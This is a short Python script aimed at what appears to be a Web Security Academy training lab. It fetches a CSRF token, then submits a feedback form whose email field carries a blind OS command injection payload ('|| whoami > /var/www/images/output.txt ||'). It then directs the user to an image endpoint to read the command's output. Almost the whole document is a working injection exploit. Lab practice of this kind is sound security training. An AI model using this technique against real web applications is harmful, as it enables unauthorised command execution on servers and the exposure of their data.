import requests
from bs4 import BeautifulSoup

site = '0a550032043b11ae80c14934003400a9.web-security-academy.net'
feedback_url = f'https://{site}/feedback'

s = requests.Session()

# Step 1: Get CSRF token
resp = s.get(feedback_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

# Step 2: Craft malicious payload for email field
payload = '|| whoami > /var/www/images/output.txt ||'

# Step 3: Prepare and send POST request
feedback_submit_url = f'https://{site}/feedback/submit'
post_data = {
    'csrf': csrf,
    'name': 'Jarren Calizo',
    'email': payload,  # Injected field
    'subject': 'Testing output redirection',
    'message': 'This is a blind command injection test.'
}

resp = s.post(feedback_submit_url, data=post_data)

# Step 4: Print the result of the form submission
print("[✓] Feedback form submitted. Now manually access:")
print(f"https://{site}/image?filename=output.txt")
